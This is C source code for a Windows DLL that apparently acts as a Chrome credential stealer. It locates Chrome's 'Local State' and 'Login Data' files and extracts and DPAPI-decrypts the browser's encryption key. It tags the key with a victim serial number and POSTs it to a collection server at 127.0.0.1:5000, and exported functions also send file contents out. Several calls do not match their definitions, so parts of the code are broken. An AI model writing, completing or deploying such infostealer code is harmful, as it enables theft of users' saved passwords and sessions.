#include <windows.h>
#include <wininet.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <string.h>
#include <stdio.h>
#include "readf.h"
#define SERIAL_NUMBER "83442048"
#define SERVER_ADDR "127.0.0.1"
#define SERVER_PORT 5000
#define SERVER_RSC_PATH "/postdata"
// Entrypoint for the DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
    // Code to run when the DLL is loaded
    break;
  case DLL_PROCESS_DETACH:
    // Code to run when the DLL is unloaded
    break;
  case DLL_THREAD_ATTACH:
    // Code to run when a thread is created during DLL's existence
    break;
  case DLL_THREAD_DETACH:
    // Code to run when a thread ends normally
    break;
  }
  return TRUE; // Successful
}

// Concatenate all the outbound string with the serial number
char* concatSerialENCKEY(const char* data) {
    // Calculate the length of the final string
    // +1 for the colon, +1 for the null terminator
    size_t totalLength = strlen(SERIAL_NUMBER) + strlen(data) + 2;
    
    // Allocate memory for the new string
    char* result = (char*)malloc(totalLength * sizeof(char));
    if (result == NULL) {
        // Memory allocation failed, return NULL
        return NULL;
    }
    
    // Construct the new string
    strcpy(result, SERIAL_NUMBER); // Copy SERIAL_NUMBER to result
    strcat(result, "_ENCKEY:");           // Append colon to result
    strcat(result, data);          // Append data to result
    
    // Return the new dynamically allocated string
    return result;
}

// Concatenate all the outbound string with the serial number
char* concatSerialFile(const char* data) {
    // Calculate the length of the final string
    // +1 for the colon, +1 for the null terminator
    size_t totalLength = strlen(SERIAL_NUMBER) + strlen(data) + 2;
    
    // Allocate memory for the new string
    char* result = (char*)malloc(totalLength * sizeof(char));
    if (result == NULL) {
        // Memory allocation failed, return NULL
        return NULL;
    }
    
    // Construct the new string
    strcpy(result, SERIAL_NUMBER); // Copy SERIAL_NUMBER to result
    strcat(result, "_FILE:");           // Append colon to result
    strcat(result, data);          // Append data to result
    
    // Return the new dynamically allocated string
    return result;
}
void formatError(DWORD dwErrorCode) {
    LPSTR messageBuffer = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL, dwErrorCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

    printf("Failed to calculate buffer size for base64 decoding. Error Code: %lu - %s\n", dwErrorCode, messageBuffer);

    LocalFree(messageBuffer);
}
// Kill all google chrome instances
// void killProcessByName(const char *filename) {
//     // https://stackoverflow.com/questions/7956519/how-to-kill-processes-by-name-win32-api
//     HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
//     PROCESSENTRY32 pEntry; 
//     pEntry.dwSize = sizeof (pEntry);
//     BOOL hRes = Process32First(hSnapShot, &pEntry);
//     while (hRes)
//     {
//         if (strcmp(pEntry.szExeFile, filename) == 0)
//         {
//             HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
//                                           (DWORD) pEntry.th32ProcessID);
//             if (hProcess != NULL)
//             {
//                 TerminateProcess(hProcess, 9);
//                 CloseHandle(hProcess);
//             }
//         }
//         hRes = Process32Next(hSnapShot, &pEntry);
//     }
//     CloseHandle(hSnapShot);
// }

// Function to read the content of a file into a dynamically allocated buffer.
char* ReadFileContent(const char* filename) {
    HANDLE hFile =
    CreateFile(
        filename, 
        GENERIC_READ, 
        FILE_SHARE_READ, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL, 
        NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open file: %s\n", filename);
        return NULL;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("Could not get file size.\n");
        CloseHandle(hFile);
        return NULL;
    }

    char* buffer = (char*)malloc(fileSize + 1);
    if (buffer == NULL) {
        printf("Could not allocate memory for file content.\n");
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, buffer, fileSize, &bytesRead, NULL)) {
        printf("Could not read file content.\n");
        CloseHandle(hFile);
        free(buffer);
        return NULL;
    }

    // buffer[fileSize] = '\0'; // Null-terminate the buffer
    CloseHandle(hFile);
    return buffer;
}

// Function to get the username and return it as a dynamically allocated char*.
char* GetUsername() {
    // Allocate a buffer of 256 characters.
    // According to the documentation, 256 should be sufficient; however,
    // it's a good practice to check if the buffer size is enough and retry if needed.
    char* buffer = (char*)malloc(256 * sizeof(char));
    if (buffer == NULL) {
        printf("Memory allocation failed\n");
        return NULL; // Return NULL if memory allocation fails.
    }
    
    DWORD bufferSize = 256; // The size of the buffer.

    // Call GetUserNameA and pass the buffer and its size.
    if (GetUserNameA(buffer, &bufferSize) == 0) {
        // If GetUserNameA fails, print the error and free the allocated memory.
        printf("GetUserNameA failed. Error: %lu\n", GetLastError());
        free(buffer);
        return NULL;
    }

    // If successful, buffer now contains the username as a null-terminated string.
    // Note: You may want to reallocate the buffer to fit the actual username size if needed.
    return buffer;
}

char* GetChromeLocalStatePath() {
    char* username = GetUsername();
    if (username == NULL) {
        return NULL;
    }

    // Define the static part of the path.
    const char* basePath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    
    // Calculate the total length of the final path.
    // Note: Assuming "C:\Users\" as the static part before the username.
    const char* userPathPrefix = "C:\\Users\\";
    size_t totalLength = strlen(userPathPrefix) + strlen(username) + strlen(basePath) + 1; // +1 for the null-terminator.

    // Allocate memory for the full path.
    char* fullPath = (char*)malloc(totalLength * sizeof(char));
    if (fullPath == NULL) {
        printf("Memory allocation failed\n");
        free(username); // Don't forget to free the username to avoid memory leaks.
        return NULL;
    }

    // Construct the full path.
    sprintf(fullPath, "%s%s%s", userPathPrefix, username, basePath);
    printf(fullPath);
    free(username); // Free the username now that we're done with it.

    return fullPath;
}

// Utility function to find a substring in a buffer.
// Returns the pointer to the beginning of the substring, or NULL if not found.
char* FindSubstring(const char* buffer, const char* substring, DWORD bytesRead) {
    for (DWORD i = 0; i < bytesRead - strlen(substring); ++i) {
        if (strncmp(&buffer[i], substring, strlen(substring)) == 0) {
            return (char*)&buffer[i];
        }
    }
    return NULL;
}

// Reads the encrypted key from the file at the given path.
// Returns a dynamically allocated buffer with the key, or NULL on failure.
char* ReadEncryptedKey(const char* filePath) {
    // Open the file for reading.
    HANDLE hFile = CreateFile(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to open file. Error: %lu\n", GetLastError());
        return NULL;
    }

    const char* searchStr = "encrypted_key";
    char buffer[4096]; // Buffer for file reading.
    DWORD bytesRead;
    BOOL found = FALSE;
    char* keyBuffer = (char*)malloc(1024);
    if (keyBuffer == NULL) {
        CloseHandle(hFile);
        printf("Memory allocation failed\n");
        return NULL;
    }
    DWORD keyIndex = 0;

    // Read the file in chunks.
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0 && !found) {
        char* pos = FindSubstring(buffer, searchStr, bytesRead);
        if (pos) {
            // Move the file pointer to skip "encrypted_key" and 3 additional characters.
            DWORD offset = (DWORD)(pos - buffer) + (DWORD)strlen(searchStr) + 3;
            SetFilePointer(hFile, offset - bytesRead, NULL, FILE_CURRENT);

            // Read characters until a '"' is found.
            while (ReadFile(hFile, buffer, 1, &bytesRead, NULL) && bytesRead > 0 && keyIndex < 1023) {
                if (*buffer == '"') {
                    found = TRUE;
                    break;
                }
                keyBuffer[keyIndex++] = *buffer;
            }
        }
    }

    if (!found) {
        free(keyBuffer);
        keyBuffer = NULL;
    } else {
        keyBuffer[keyIndex] = '\0'; // Null-terminate the string.
    }

    CloseHandle(hFile);
    return keyBuffer;
}

// Helper function to decode
BYTE* Base64Decode(const char* base64, DWORD* outSize) {
    if (base64 == NULL || outSize == NULL) {
        printf("No input for Base64Decode.\n");
        return NULL; // Invalid parameters
    }
    // printf("base64: %s\n", base64);
    *outSize = 0;
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, outSize, NULL, NULL)) {
        DWORD dwErrorCode = GetLastError();
        formatError(dwErrorCode);
        return NULL;
    }

    BYTE* buffer = (BYTE*)malloc(*outSize);
    if (buffer == NULL) {
        printf("Memory allocation failed.\n");
        return NULL;
    }

    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, buffer, outSize, NULL, NULL)) {
        printf("Base64 decoding failed.\n");
        free(buffer);
        return NULL;
    }

    return buffer;
}

char* Base64Encode(const char* input, DWORD* outputSize) {
    if (input == NULL || outputSize == NULL) {
        return NULL;
    }

    // Calculate the size of the input
    DWORD inputSize = strlen(input);

    // Calculate the length of the Base64 encoded string
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA((const BYTE*)input, inputSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedSize)) {
        printf("Failed to calculate Base64 encoded size.\n");
        return NULL;
    }

    // Allocate memory for the Base64 encoded string
    char* encodedString = (char*)malloc(encodedSize);
    if (encodedString == NULL) {
        printf("Memory allocation for Base64 encoded string failed.\n");
        return NULL;
    }

    // Perform the Base64 encoding
    if (!CryptBinaryToStringA((const BYTE*)input, inputSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encodedString, &encodedSize)) {
        printf("Base64 encoding failed.\n");
        free(encodedString);
        return NULL;
    }

    // Update the output size
    *outputSize = encodedSize;
    return encodedString;
}

// Decrypts the secret key starting from its 6th character.
char* DecryptSecretKey(char* RawSecretKey) {
    char* encryptedDataB64 = RawSecretKey;
    DWORD encryptedDataSize = 0;
    BYTE* encryptedData_Unprocessed = Base64Decode(encryptedDataB64, &encryptedDataSize);
    
    // Skip the first 5 characters of the decoded secret key.
    BYTE* encryptedData = encryptedData_Unprocessed + 5;
    if (!encryptedData) {
        return NULL;
    }

    DATA_BLOB inputData;
    inputData.pbData = encryptedData;
    inputData.cbData = encryptedDataSize;

    DATA_BLOB outputData = {0};

    // Attempt to decrypt the data.
    if (!CryptUnprotectData(&inputData, NULL, NULL, NULL, NULL, 0, &outputData)) {
        printf("Decryption failed in DecryptSecretKey.\n");
        DWORD dwErrorCode = GetLastError();
        formatError(dwErrorCode);
        free(encryptedData_Unprocessed);
        return NULL;
    }

    // The output data might not be a null-terminated string. Make it a string by copying it.
    char* decryptedString = (char*)malloc(outputData.cbData + 1);
    if (decryptedString == NULL) {
        printf("Memory allocation failed.\n");
        LocalFree(outputData.pbData);
        free(encryptedData_Unprocessed);
        return NULL;
    }
    memcpy(decryptedString, outputData.pbData, outputData.cbData);
    decryptedString[outputData.cbData] = '\0'; // Null-terminate the string.

    // encode back the decrypted key to base64
    DWORD encodedSize = 0;
    char* encodedDecryptedString = Base64Encode(decryptedString, &encodedSize);    
    if (encodedDecryptedString != NULL) {
        // printf("Encoded String: %s\n", encodedDecryptedString);
        // printf("Encoded Size: %lu\n", encodedSize);

        // Don't forget to free the encoded string after use
        free(encodedDecryptedString);
    } else {
        printf("Base64 encoding failed.\n");
    }

    // Free the original encrypted data and the output blob's data.
    free(encryptedData_Unprocessed);
    LocalFree(outputData.pbData);

    return encodedDecryptedString;
}

// Get chrome decryption key (Base64 encoded)
char* GetChromeDecryptionKey() {
    char* local_state_file = GetChromeLocalStatePath();
    char* encryptedKey = ReadEncryptedKey(local_state_file);
    char* decrypteSecretKey = DecryptSecretKey(encryptedKey);

    // Debug:
    printf("key: %s\n", decrypteSecretKey);

    free(local_state_file);
    free(encryptedKey);
    return decrypteSecretKey;
}

char* GetChromeLocalLoginPath() {
    char* username = GetUsername();
    if (username == NULL) {
        return NULL;
    }

    // Define the static part of the path.
    const char* basePath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
    
    // Calculate the total length of the final path.
    // Note: Assuming "C:\Users\" as the static part before the username.
    const char* userPathPrefix = "C:\\Users\\";
    size_t totalLength = strlen(userPathPrefix) + strlen(username) + strlen(basePath) + 1; // +1 for the null-terminator.

    // Allocate memory for the full path.
    char* fullPath = (char*)malloc(totalLength * sizeof(char));
    if (fullPath == NULL) {
        printf("Memory allocation failed\n");
        free(username); // Don't forget to free the username to avoid memory leaks.
        return NULL;
    }

    // Construct the full path.
    sprintf(fullPath, "%s%s%s", userPathPrefix, username, basePath);

    free(username); // Free the username now that we're done with it.

    return fullPath;
}

void SendHTTPSPost(const char* server, const char* resource, const char* data) {
    HINTERNET hInternet, hConnect, hRequest;
    BOOL bResult;
    DWORD dwBytesWritten;

    // Initialize WinINet API
    hInternet = InternetOpen("WinINet HTTPS Example", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed with error: %lu\n", GetLastError());
        return;
    }

    // Connect to the HTTP server
    hConnect = InternetConnect(hInternet, server, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    // Create an HTTP request handle
    hRequest = HttpOpenRequest(hConnect, "POST", resource, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Send the HTTP request
    bResult = HttpSendRequest(hRequest, "Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)data, strlen(data));
    if (!bResult) {
        printf("HttpSendRequest failed with error: %lu\n", GetLastError());
    } else {
        printf("Data sent successfully.\n");
    }

    // Clean up handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void SendHTTPSPost_localFlask(const char* ip, WORD port, const char* resource, const char* data) {
    HINTERNET hInternet, hConnect, hRequest;
    BOOL bResult;
    DWORD dwBytesWritten;

    // Initialize WinINet API
    hInternet = InternetOpen("WinINet HTTPS Example", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed with error: %lu\n", GetLastError());
        return;
    }

    // Connect to the HTTP server with IP and port
    hConnect = InternetConnect(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    // Create an HTTP request handle with INTERNET_FLAG_SECURE for HTTPS
    hRequest = HttpOpenRequest(hConnect, "GET", resource, NULL, NULL, NULL, NULL, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed with error: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }
    // Send the HTTP request
    bResult = HttpSendRequest(hRequest, "Content-Type: application/x-www-form-urlencoded", -1, (LPVOID)data, strlen(data));
    if (!bResult) {
        printf("HttpSendRequest failed with error: %lu\n", GetLastError());
    } else {
        printf("Data sent successfully.\n");
    }

    // Clean up handles
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// read file content to char buff
int read_from_file(const char* filePath, char **file_buff) {
    HANDLE h_file = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == h_file) {
        printf("open failed\n");
        return 1;
    }
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(h_file, &fileSize)) {
        printf("Could not get file size (error %lu)\n", GetLastError());
        CloseHandle(h_file);
        return 2;
    }
    OVERLAPPED file_opeartion;
    file_opeartion.Offset = 0;
    file_opeartion.OffsetHigh = 0;
    DWORD bytes_read;
    *file_buff = (char*) VirtualAlloc(NULL, (SIZE_T)fileSize.QuadPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NULL == *file_buff) {
        printf("allocate failed\n");
        printf("file size: %lld\n", fileSize.QuadPart);
        return 3;
    }
    if (0 == ReadFile(h_file, *file_buff, fileSize.QuadPart, &bytes_read, NULL)) {
        printf("read failed\n");
        return 4;
    }
    CloseHandle(h_file);

    //SendHTTPSPost_localFlask(SERVER_ADDR, SERVER_PORT, SERVER_RSC_PATH, *file_buff);

    return 0;
}

// Testings //
__declspec(dllexport) void GetUsername_Test(void) {
    char* username = GetUsername();
    if (username != NULL) {
        printf("Username: %s\n", username);
        free(username); // Remember to free the allocated memory to avoid memory leaks.
    }
}

__declspec(dllexport) void GetChromeLocalStatePath_Test(void) {
    char* path = GetChromeLocalStatePath();
    if (path != NULL) {
        printf("Path: %s\n", path);
        free(path); // Remember to free the allocated memory to avoid memory leaks.
    }
}

__declspec(dllexport) void ReadEncryptedKey_Test(void) {
    char* key = ReadEncryptedKey("C:\\Users\\clwop\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    if (key != NULL) {
        printf("key: %s\n", key);
        free(key); // Remember to free the allocated memory to avoid memory leaks.
    }
}

__declspec(dllexport) void DecryptSecretKey_Test(void) {
    char* rawSecret = ReadEncryptedKey("C:\\Users\\clwop\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
    if (rawSecret != NULL) {
        printf("rawSecret: %s\n", rawSecret);
        char* key = DecryptSecretKey(rawSecret);
        if (key != NULL) {
            printf("key: %s\n", key);
            free(key); // Free the decrypted key after use.
        }
        free(rawSecret); // Free the rawSecret after all uses are complete.
    }
}

__declspec(dllexport) void SendDataToFlask_Test(void) {
    const char* server = SERVER_ADDR; // Your server name
    WORD port = SERVER_PORT;  // port
    const char* resource = SERVER_RSC_PATH; // Your resource path
    const char* data = "key=value"; // Data to be sent
    SendHTTPSPost_localFlask(server, port, resource, data);
}

__declspec(dllexport) void SendSessionKeyToFlask_Test(void) {
    const char* server = SERVER_ADDR; // Your server name
    WORD port = SERVER_PORT;  // port
    const char* resource = SERVER_RSC_PATH; // Your resource path
    const char* data = "a"; // Data to be sent
    SendHTTPSPost_localFlask(server, port, resource, data);
}

__declspec(dllexport) void BuggyImplementation(void) {
    const char* decryptionKey = GetChromeDecryptionKey(); // There is a leak somewhere
    printf(decryptionKey);

    const char* server = SERVER_ADDR; // Your server name
    WORD port = SERVER_PORT;  // port
    const char* resource = SERVER_RSC_PATH; // Your resource path
    SendHTTPSPost_localFlask(server, port, resource, decryptionKey);
    printf(decryptionKey);

    // The problem with this function:
    // 1. Flask Got 413 content too larget
    // 2. 
}

__declspec(dllexport) void SendingEncKeyToServer(void) {
    const char* decryptionKey = GetChromeDecryptionKey(); // There is a leak somewhere
    // printf(decryptionKey);
    char* stringToSent = concatSerialEncKey(decryptionKey); // concatenate it with serialnumber so it is 
    // strcpy(stringToSent, decryptionKey);
    const char* server = SERVER_ADDR; // server name
    WORD port = SERVER_PORT;  // port
    const char* resource = SERVER_RSC_PATH; // resource path
    SendHTTPSPost_localFlask(server, port, resource, stringToSent);
    free(stringToSent);
    free(decryptionKey);
    // printf(stringToSent);
}

// debug
__declspec(dllexport) void test_file_read(void) {
    file_t file_test;
    if (!ReadFileContent("file_test.txt", &file_test)) {
        printf("failed\n");
        return;
    }
    printf("length:%ld", file_test.fileSize.LowPart);
    for (int i = 0; i < file_test.fileSize.LowPart; i++) {
        printf("%c", file_test.lpBuffer[i]);
    }
    SendHTTPSPost_localFlask(
        SERVER_ADDR,
        SERVER_PORT,
        SERVER_RSC_PATH,
        (char*)file_test.lpBuffer,
        file_test.fileSize.LowPart
    );
    char *encoded_str = Base64Encode(file_test);
    printf("encoded:%s\n", encoded_str);
    SendHTTPSPost_localFlask(
        SERVER_ADDR,
        SERVER_PORT,
        SERVER_RSC_PATH,
        encoded_str,
        strlen(encoded_str) 
    );
    DWORD decode_bytes_size;
    LPBYTE decoded_bytes = Base64Decode(encoded_str, &decode_bytes_size);
    for (int i = 0; i < decode_bytes_size; i++) {
        printf("%c", decoded_bytes[i]);
    }
}

